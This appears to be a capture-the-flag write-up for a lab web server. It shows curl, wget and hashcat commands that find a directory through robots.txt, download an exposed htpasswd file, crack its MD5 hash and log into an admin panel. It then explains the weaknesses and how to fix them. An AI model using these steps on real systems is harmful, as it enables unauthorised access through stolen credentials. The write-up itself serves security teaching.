# Directory Listing & Exposed Credentials — Documentation

## How I Found It

**Discovery via robots.txt:**
- Checked `http://192.168.1.16/robots.txt` (standard practice)
- Found: `Disallow: /whatever/`
- Hypothesis: Hidden directory might contain sensitive files

**Initial reconnaissance:**
- Visited `http://192.168.1.16/whatever/`
- Server returned directory listing (should be 403 Forbidden):
```html
<h1>Index of /whatever/</h1>
<a href="htpasswd">htpasswd</a>    29-Jun-2021 18:09    38
```

**Discovery:**
- Downloaded `htpasswd` file
- Contents: `root:437394baff5aa33daa618be47b75cb49`
- Recognized MD5 hash → Cracked online: `qwerty123@`
- Found admin panel at `/admin/`
- Logged in with `root:qwerty123@` → Flag revealed

## How I Exploited It

**Step-by-step:**

1. **Check robots.txt:**
```bash
curl http://192.168.1.16/robots.txt
```

2. **Access directory:**
```bash
curl http://192.168.1.16/whatever/
```

3. **Download htpasswd:**
```bash
wget http://192.168.1.16/whatever/htpasswd
cat htpasswd
# root:437394baff5aa33daa618be47b75cb49
```

4. **Crack MD5:**
```bash
# Online: https://crackstation.net/
# Offline:
echo "437394baff5aa33daa618be47b75cb49" > hash.txt
hashcat -m 0 hash.txt rockyou.txt
# Result: qwerty123@
```

5. **Login:**
```bash
curl -X POST -d "username=root&password=qwerty123@&Login=Login" \
  http://192.168.1.16/admin/
```

**Flag obtained:**
```
d19b4823e0d5600ceed56d5e896ef328d7a2b9e7ac7e80f4fcdb9b10bcb3e7ff
```

## Why It Works

**Vulnerabilities:**
1. **robots.txt disclosure** → Advertises sensitive directories
2. **Directory listing enabled** → Exposes all files in folder
3. **Exposed credentials** → htpasswd accessible without auth
4. **Weak MD5 hashing** → No salt, easily cracked
5. **Weak password** → Common password in breach databases

**The irony:** robots.txt says "don't look here" → Attackers look first!

## How to Fix It

**Core principle:** Don't expose file structure. Protect sensitive files. Use strong hashing.

**Essential fixes:**
1. **Disable directory listing** - Return 403 for directories
2. **Remove/secure htpasswd** - Store outside web root with 600 permissions
3. **Use bcrypt/Argon2** - Replace MD5 with modern hashing
4. **Strong passwords** - Enforce complexity requirements
5. **Don't rely on robots.txt** - Not a security mechanism
6. **Multi-Factor Authentication** - Protect admin access


## References

- OWASP A01:2021 – Broken Access Control — https://owasp.org/Top10/A01_2021-Broken_Access_Control/
- CWE-548 — https://cwe.mitre.org/data/definitions/548.html
- CWE-522 — https://cwe.mitre.org/data/definitions/522.html
- OWASP Password Storage Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html
- CWE-548: Directory Listing
- CWE-522: Insufficiently Protected Credentials  
- CWE-327: Broken Cryptographic Algorithm
- OWASP A01:2021 – Broken Access Control
